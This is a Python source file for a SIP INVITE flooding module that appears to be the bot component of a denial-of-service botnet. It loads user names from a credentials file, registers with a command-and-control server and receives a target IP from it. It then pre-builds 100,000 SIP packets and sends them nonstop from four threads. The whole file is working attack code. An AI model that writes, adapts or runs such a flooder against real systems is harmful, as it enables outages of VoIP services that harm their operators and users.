import csv
import socket
import threading

import generatePacket
import registerClient
import sendInvite
import time
import messageCreator
import random


class FloodModule:
    s = None
    gp = None
    mc = None
    data = []
    running = None
    message_array = []
    packet_array = []
    credentials = []
    users = []

    def __init__(self):
        self.running = False
        self.s = sendInvite.SendInvite
        self.read_users()
        self.mc = messageCreator.MessageCreator(self.users)
        self.gp = generatePacket.GeneratePacket()


    def read_users(self):
        with open('credentials.csv') as f:
            lines = f.readlines()
        for i in range(len(lines)):
            line = lines[i]
            credentials = line.split(';')
            self.users.append(credentials[0])

    def fire_thread(self, payload, packet_array):
        """Call sendInvite to fire payload to the SIP server"""
        global running
        running = True
        while running:
            self.s.fire(payload, packet_array)

    def init_flooding(self, serveraddress, local_ip):
        r = registerClient.RegisterClient(serveraddress, 40000, local_ip)
        r.register()
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind(("0.0.0.0", 50000))

        buffersize = 1024
        while not self.data:
            self.data = sock.recvfrom(buffersize)
        print("Registered at cnc server")
        print("Starting packet initialisation. This will take a while...")
        for i in range(0,1000):
            self.message_array.append(self.mc.make_message())
        target_ip = self.data[0].decode()
        for i in range(0, 100000):
            message = self.message_array[random.randint(0, 999)]
            self.packet_array.append(self.gp.generate(message, target_ip))
        print("Finished initializing.")
        threads = []
        for i in range(0, 4):
            t = threading.Thread(target=self.fire_thread, args=(target_ip, self.packet_array,))
            t.daemon = True
            threads.append(t)

        for i in range(0, 4):
            threads[i].start()

        while True:
            time.sleep(1)
